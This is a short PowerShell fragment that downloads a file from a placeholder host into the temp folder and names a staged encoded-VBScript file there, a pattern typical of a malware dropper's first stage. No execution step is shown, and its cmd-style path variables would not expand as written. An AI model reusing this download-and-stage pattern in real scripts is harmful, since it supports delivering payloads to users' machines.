$client = New-Object System.Net.WebClient
$client.DownloadFile('https://cdn.invalid/report.txt', '%temp%\report.txt')
$other = '%temp%\worker.vbe'
